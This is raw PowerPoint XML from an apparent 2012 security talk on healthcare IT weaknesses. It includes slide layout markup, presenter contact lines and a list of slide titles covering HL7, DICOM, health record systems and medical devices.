            <a:off x="467544" y="2060848"/>
            <a:ext cx="7772400" cy="936104"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>
              </a:contourClr>
            </a:sp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fr-CA" sz="8800" b="1" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>You!</a:t>
            </a:r>
            <a:endParaRPr lang="fr-CA" sz="8800" cap="all" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5134880"/>
            <a:ext cx="9144000" cy="886408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
              <a:prstClr val="black">
                <a:alpha val="40000"/>
              </a:prstClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:lnRef>
          <a:fillRef idx="3">
            <a:schemeClr val="accent5"/>
          </a:fillRef>
          <a:effectRef idx="2">
            <a:schemeClr val="accent5"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="lt1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="fr-CA"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Sous-titre 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="560866" y="3501008"/>
            <a:ext cx="5451294" cy="1512168"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tim Elrod: tim.elrod@fishnetsecurity.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Stefan Morris: h0rktik@h0rk.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1800" i="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="1283754028"/>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1881</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>268</Paragraphs>
  <Slides>38</Slides>
  <Notes>38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Nilland</vt:lpstr>
      <vt:lpstr>Nilland-Black</vt:lpstr>
      <vt:lpstr>Wingdings 2</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>I’m not a doctor…</vt:lpstr>
      <vt:lpstr>Slide 2</vt:lpstr>
      <vt:lpstr>Whywouldanattackercare?</vt:lpstr>
      <vt:lpstr>technologyredux</vt:lpstr>
      <vt:lpstr>Slide 5</vt:lpstr>
      <vt:lpstr>hl7interfacesystems</vt:lpstr>
      <vt:lpstr>Hl7v2.xexample</vt:lpstr>
      <vt:lpstr>hl7routers</vt:lpstr>
      <vt:lpstr>Slide 9</vt:lpstr>
      <vt:lpstr>pacs</vt:lpstr>
      <vt:lpstr>dicomnetworkprotocol</vt:lpstr>
      <vt:lpstr>24hrs=875openports</vt:lpstr>
      <vt:lpstr>typicaldeexplicitvr</vt:lpstr>
      <vt:lpstr>defromhell</vt:lpstr>
      <vt:lpstr>dicomfileformat</vt:lpstr>
      <vt:lpstr>fuzzingmedicalprotocols</vt:lpstr>
      <vt:lpstr>Slide 17</vt:lpstr>
      <vt:lpstr>Electronic(health/medical)recordsystems</vt:lpstr>
      <vt:lpstr>Healthinformationexchanges</vt:lpstr>
      <vt:lpstr>Personalhealthrecords(phr)</vt:lpstr>
      <vt:lpstr>Microsofthealthvault(HV)</vt:lpstr>
      <vt:lpstr>Malicioushealthrecords(MHR)</vt:lpstr>
      <vt:lpstr>Igotmadalertboxesyo!</vt:lpstr>
      <vt:lpstr>noteventrying4storedxss</vt:lpstr>
      <vt:lpstr>pwnedinthewild</vt:lpstr>
      <vt:lpstr>unintendedconsequences</vt:lpstr>
      <vt:lpstr>Slide 27</vt:lpstr>
      <vt:lpstr>medicalhardwarereview</vt:lpstr>
      <vt:lpstr>omnicellomniexplorer</vt:lpstr>
      <vt:lpstr>omniexploder</vt:lpstr>
      <vt:lpstr>deathpackets</vt:lpstr>
      <vt:lpstr>Slide 32</vt:lpstr>
      <vt:lpstr>mischealthcarepennotes</vt:lpstr>
      <vt:lpstr>mischealthcarepennotes2</vt:lpstr>
      <vt:lpstr>Summaryoffolly</vt:lpstr>
      <vt:lpstr>Solutions</vt:lpstr>
      <vt:lpstr>Slide 37</vt:lpstr>
      <vt:lpstr>Slide 38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2012-06-14T01:45:58Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2012-06-14T05:07:54Z</dcterms:modified>
</cp:coreProperties>
</file>